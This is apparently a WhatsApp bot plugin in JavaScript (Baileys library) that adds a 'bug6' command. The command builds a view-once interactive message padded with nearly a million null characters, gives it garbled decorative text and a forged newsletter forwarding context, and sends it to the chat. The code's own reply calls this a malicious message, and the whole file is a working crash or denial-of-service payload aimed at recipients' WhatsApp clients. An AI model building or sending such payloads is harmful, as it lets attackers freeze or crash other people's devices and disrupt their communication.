import { generateWAMessageFromContent } from '@whiskeysockets/baileys';
import crypto from 'crypto';

let handler = async (m, { conn }) => {
  let botNumber = conn.user.id.split(':')[0] + '@s.whatsapp.net'; // Número donde está vinculado el bot

  if (m.sender !== botNumber) return m.reply('⛔ Este comando solo puede usarlo el número donde está vinculado el bot.');

  try {
    const msg = await generateWAMessageFromContent(m.chat, {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            messageSecret: crypto.randomBytes(32)
          },
          interactiveResponseMessage: {
            body: {
              text: "馃└ 饾悜蜖饾悽袒饾惓廷饾惐童饾悤袒饾悶蜏饾惀袒饾惓汀 饾悗蜖饾悷袒饾悷廷饾悽蜏饾悳童饾悽袒饾悮袒饾惀-饾悎童饾悆",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "flex_agency",
              paramsJson: "\u0000".repeat(999999),
              version: 3
            },
            contextInfo: {
              isForwarded: true,
              forwardingScore: 9741,
              forwardedNewsletterMessageInfo: {
                newsletterName: "trigger newsletter ( @denny )",
                newsletterJid: "120363321780343299@newsletter",
                serverMessageId: 1
              }
            }
          }
        }
      }
    }, { quoted: m });

    await conn.relayMessage(m.chat, msg.message, { messageId: msg.key.id });

    // Indicador que funcionó:
    await m.react('✅');
    await m.reply('✅ Mensaje malicioso enviado con éxito.');

  } catch (e) {
    await m.react('❌');
    await m.reply(`❌ Error al enviar el mensaje: ${e.message}`);
  }
};

handler.help = ['bug6'];
handler.tags = ['traba'];
handler.command = ['bug6'];
handler.group = false;

export default handler;